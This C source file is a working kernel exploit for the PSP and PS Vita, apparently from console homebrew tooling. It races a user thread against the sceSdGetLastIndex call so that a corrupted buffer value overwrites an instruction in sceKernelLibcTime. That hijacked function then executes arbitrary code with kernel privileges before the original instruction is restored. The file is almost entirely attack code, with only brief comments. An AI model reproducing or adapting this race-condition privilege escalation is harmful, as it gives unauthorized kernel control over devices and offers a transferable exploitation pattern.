
#include "main.h"

/*
 sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
*/

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

int savedata_open = 0;

volatile u32 packet[256];
volatile int is_exploited;

volatile u32 libctime_addr = NULL;
volatile u32 libctime_inst = 0;

void executeKernel(u32 kernelContentFunction)
{
    _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
}

void repairInstruction(){
    _sw(libctime_inst, libctime_addr); // recover the damage we've done
}

void KernelFunction()
{
    is_exploited = 1;
}

int stubScanner(u32 patch_addr, u32 orig_inst){

    // vulnerable function
    pspDebugScreenPrintf("Scanning vulnerable function\n");
    _sceSdGetLastIndex = (void*)FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    if (_sceSdGetLastIndex == NULL){
        pspDebugScreenPrintf("Opening savedata utility\n");
        if (!savedata_open){
            p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
            savedata_open = 1;
        }
        _sceSdGetLastIndex = (void*)FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
        if (_sceSdGetLastIndex == NULL) _sceSdGetLastIndex = (void*)FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    }
    // the function we need to patch
    libctime_addr = patch_addr;
    libctime_inst = orig_inst;
    _sceKernelLibcTime = (void*)(&sceKernelLibcTime);

    sceKernelDcacheWritebackAll();

    pspDebugScreenPrintf("_sceSdGetLastIndex: %p\n", _sceSdGetLastIndex);

    return (_sceSdGetLastIndex == NULL);
}

// the threads that will make sceSdGetLastIndex vulnerable
int qwik_thread()
{
    while (is_exploited != 1) {
        packet[9] = libctime_addr - 18 - (u32)packet;
        sceKernelDelayThread(0);
    }

    return 0;
}

int doExploit()
{

    pspDebugScreenPrintf("Attempting kernel exploit\n");

    is_exploited = 0;

    // we create the thread and constantly attempt the exploit
    SceUID qwikthread = sceKernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
    sceKernelStartThread(qwikthread, 0, NULL);

    while (is_exploited != 1) {
        packet[9] = (u32)16;
        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
        sceKernelDelayThread(0);
        _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
        sceKernelDcacheWritebackAll();
    }
    sceKernelTerminateDeleteThread(qwikthread);

    pspDebugScreenPrintf("Kernel exploit done\n");

    return 0;
}
